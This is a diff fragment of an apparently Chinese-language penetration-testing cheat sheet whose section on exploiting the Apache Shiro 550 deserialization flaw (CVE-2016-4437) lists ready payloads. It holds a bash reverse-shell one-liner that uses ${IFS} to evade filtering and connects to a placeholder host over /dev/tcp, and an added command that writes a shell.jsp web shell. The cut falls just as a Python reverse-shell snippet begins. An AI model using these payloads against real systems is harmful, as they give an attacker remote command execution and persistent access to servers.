@@ -19,10 +19,20 @@ try{
 ### shiro 550
 反弹shell
 https://bkfish.gitee.io/2020/04/24/Apache-Shiro-1-2-4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89%E5%A4%8D%E7%8E%B0%E9%81%87%E5%88%B0%E7%9A%84%E5%9D%91/
+
+
+https://mp.weixin.qq.com/s/zCe_O37rdRqgN-Yvlq1FDg
+
 ```
 cc2 
 bash -c bash${IFS}-i${IFS}>&/dev/tcp/XXXXX/XX<&1
+
 ```
+并且执行命令
+```bash
+sh -c $@ | sh . echo `echo shell>shell.jsp`
+```
+
 ## python
 ```
 import socket,subprocess,os
